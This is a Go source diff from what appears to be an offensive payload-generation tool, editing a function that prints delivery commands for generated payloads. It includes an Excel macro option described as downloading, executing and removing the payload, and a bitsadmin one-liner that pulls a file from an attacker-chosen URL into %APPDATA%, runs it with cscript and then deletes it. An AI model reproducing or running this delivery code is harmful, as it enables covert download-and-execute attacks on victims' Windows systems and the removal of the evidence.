@@ -136,7 +136,7 @@ func Zipit(source, target string) error {
 	return err
 }
 
-func Command(URL string, CommandLoader string, outFile string) {
+func Command(URL string, CommandLoader string, outFile string) string {
 
 	if URL != "" && CommandLoader == "hta" {
 		fmt.Println("[*] HTA Payload")
@@ -148,7 +148,7 @@ func Command(URL string, CommandLoader string, outFile string) {
 		}
 	}
 	if URL == "" && !strings.Contains(outFile, ".js") && !strings.Contains(outFile, ".hta") {
-		fmt.Println(color.GreenString("[+] ") + "Non Executable file extension detected. Use the following to execute it (note that this works from a local instance, webdav or fileshare... not a  webserver):")
+		fmt.Println(color.GreenString("[+] ") + "Non Executable file extension detected. Either add the extension \".js\" or use the following to execute it (note that this works from a local instance, webdav or fileshare... not a  webserver):")
 		fmt.Println("cscript //E:jscript " + outFile + "")
 	}
 	if URL != "" && CommandLoader == "macro" {
@@ -157,13 +157,13 @@ func Command(URL string, CommandLoader string, outFile string) {
 			URL = URL + "/"
 		}
 		fmt.Println("[*] Macro Delivery Payload")
-		fmt.Println("[!] Office macro that will download, execute and remove the payload:")
+		fmt.Println("[!] Excel macro that will download, execute and remove the payload:")
 	}
 
 	if URL != "" && CommandLoader == "bits" {
 		fmt.Println("[*] Bitsadmin")
 		fmt.Println("[!] One liner command to execute it:")
-		if !strings.Contains(outFile, ".js") && !strings.Contains(outFile, ".hta") {
+		if !strings.Contains(outFile, ".js") && !strings.Contains(outFile, ".hta") && !strings.Contains(outFile, ".cpl") && !strings.Contains(outFile, ".exe") {
 			if strings.HasSuffix(URL, "/") {
 				fmt.Println("bitsadmin /transfer " + outFile + " " + URL + outFile + " %APPDATA%\\" + outFile + " & cscript //E: JScript %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")
 			} else {
@@ -178,4 +178,5 @@ func Command(URL string, CommandLoader string, outFile string) {
 			}
 		}
 	}
+	return URL
 }
